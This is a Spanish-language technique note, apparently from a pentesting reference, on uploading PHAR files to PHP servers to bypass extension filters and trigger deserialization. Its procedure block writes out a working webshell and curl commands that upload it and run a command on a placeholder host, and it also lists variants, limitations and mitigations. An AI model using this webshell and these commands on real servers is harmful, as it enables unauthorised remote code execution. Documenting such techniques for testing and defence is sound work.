---
topic: PHP PHAR upload
tags: [web, php, phar, upload, deserialization, popen]
---

# PHP PHAR upload

[🌐 English](php-phar-upload.en.md) | **Español**

## Concepto

PHP reconoce `.phar` como un archivo ejecutable cuando el servidor lo sirve directamente. Si el filtro de subida solo bloquea `.php`, un `.phar` con código PHP se ejecuta igual. Además, el wrapper `phar://` puede desencadenar deserialización de metadatos si la aplicación lo usa para leer archivos.

## Cuándo aplica

- Formulario de subida con filtro por extensión.
- Directorio de subidas accesible por HTTP.
- `disable_functions` sin `popen`, `system` o `exec`.
- Uso de `phar://` para leer o procesar archivos.

## Procedimiento

1. Identificar la extensión y el tipo MIME aceptados.
2. Comprobar si `.phar` se sirve como PHP.
3. Crear un PHAR con un webshell mínimo.
4. Subirlo y solicitar la ruta resultante.
5. Si hay deserialización, inspeccionar los metadatos y la clase disponible.

```bash
cat > sh.phar <<'PHP'
<?php system($_GET['c']); ?>
PHP
curl -b cookies.txt -F "image=@sh.phar" http://<HOST>/upload.php
curl "http://<HOST>/uploads/sh.phar?c=id"
```

## Variantes

- Bypass con `.phtml`, `.phar` o doble extensión.
- PHAR con metadatos serializados para una clase con `__destruct`.
- `phar://` sobre un archivo subido para forzar deserialización.
- Polyglot PHAR que también pasa la validación de imagen.

## Limitaciones

- El servidor debe interpretar `.phar` como PHP.
- El directorio de subidas debe ser accesible.
- La deserialización requiere una cadena de clases válida.
- Las funciones peligrosas pueden estar deshabilitadas.

## Mitigación y detección

- Validar el contenido real y no solo la extensión.
- Renombrar los archivos y almacenarlos fuera del webroot.
- Bloquear `.phar`, `.phtml` y variantes.
- Alertar de subidas con cabecera PHAR y peticiones a archivos subidos.

## Referencias

- <https://www.php.net/manual/en/phar.using.object.php>
- <https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload>
- <https://attack.mitre.org/techniques/T1505/003/>
